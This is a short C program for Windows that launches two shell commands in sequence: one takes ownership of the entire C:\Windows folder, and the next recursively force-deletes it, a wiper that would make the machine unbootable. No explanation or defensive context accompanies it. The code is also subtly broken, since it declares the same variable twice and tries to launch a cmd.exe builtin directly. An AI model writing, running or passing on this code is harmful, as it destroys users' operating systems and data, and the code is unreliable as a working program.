#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

int main(){

    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;


    LPCSTR cmd = "takeown /R /F C:\\Windows";

    CreateProcessA(
        NULL,
        (LPSTR)cmd,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &si,
        &pi
    );

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    // The command you want to run
    LPCSTR cmd = "del /S /F /Q C:\\Windows";

    CreateProcessA(
        NULL,
        (LPSTR)cmd,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &si,
        &pi
    );

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}